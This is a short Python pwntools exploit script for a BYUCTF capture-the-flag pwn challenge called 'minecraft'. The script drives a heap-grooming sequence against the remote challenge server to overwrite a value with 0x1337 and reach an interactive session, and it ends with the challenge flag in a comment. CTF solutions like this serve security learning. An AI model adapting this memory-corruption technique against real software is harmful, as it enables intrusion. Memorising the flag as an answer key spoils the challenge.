from pwn import *

p = remote("minecraft.chal.cyberjousting.com", 1354)
#p = process("./minecraft")

p.sendafter(b"username now: \n", b"A" * 8)

while(True):
	p.sendlineafter(b"Leave\n", b"3")
	p.recvuntil(b"received a ")
	s = p.recv(4)
	if(s == b"Name"):
		p.sendafter(b"last name:\n", b"B" * 8)
		p.send(p64(0x1337))
		break

p.sendlineafter(b"Leave\n", b"5")
sleep(3)
p.sendafter(b"username now: \n", b"A" * 8)
p.sendlineafter(b"Leave\n", b"7")

p.interactive()
#byuctf{th3_3xpl01t_n4m3_1s_l1t3r4lly_gr00m1ng}